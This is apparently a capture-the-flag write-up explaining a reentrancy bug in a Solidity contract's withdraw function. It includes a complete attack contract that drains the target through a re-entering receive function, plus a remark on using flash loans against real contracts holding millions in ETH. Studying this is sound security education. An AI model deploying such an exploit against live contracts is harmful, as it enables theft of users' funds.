### Analysis
The issue with this function is that the internal balance of the sender's address is not reduced until the very end of the function. This fact can be exploited if the sender is a smart contract itself.
Some important notes:

The receive function in the attack contract must have some terminating condition, it can't just call withdraw in an infinite loop or else the transaction will not be valid.
There also can't be too many loops, otherwise the transaction will run out memory and/or gas . For this reason, it's most efficient to pass an amount to exploit exactly equal to the original contract's balance. That way, only one withdraw loop is run before the transaction terminates, thus saving gas and preventing memory issues.

In real life, a target contract could have a balance with millions of dollars worth of ETH. It's unlikely we'd have such a large amount of ETH sitting in our wallet to initiate the exploit. However, the attack can still be initiated by taking a flash loan to borrow (and return) that amount of ETH in the same transaction.

### The Exploit
deployed the follow contract,call the function of exploit:
~~~
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IReentrance{
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}
contract ReentranceWrapper{
    // unit amount = IReentrance(_to).balanceOf(address(this));
    address payable owner;
    IReentrance target;

    constructor(address _target){
        owner = payable(msg.sender);
        target = IReentrance(_target);
    }

    function close() external{
        require(msg.sender ==owner);
        selfdestruct(owner);
    }

    function exploit() public payable{
        target.donate{value:msg.value}(address(this));
        target.withdraw(msg.value);
    }


    receive() external payable {  
        if(address(target).balance >= msg.value){
            target.withdraw(msg.value);
        }
    }
}
~~~